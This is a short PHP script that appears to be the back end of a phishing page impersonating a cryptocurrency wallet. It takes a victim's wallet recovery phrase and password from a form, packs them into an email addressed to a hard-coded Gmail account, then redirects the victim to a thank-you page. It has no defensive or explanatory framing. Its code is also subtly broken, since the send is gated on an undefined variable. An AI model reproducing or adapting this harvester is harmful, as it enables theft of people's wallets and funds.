<?php
//get data from form  
$mnemonic = $_POST['mnemonic'];
$password= $_POST['password'];
$to = "rolandferanmi1@gmail.com";
$subject = "Mail From tethawallet";
$txt ="Mnemonic = ". $mnemonic . "\r\nPassword = " . $password;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>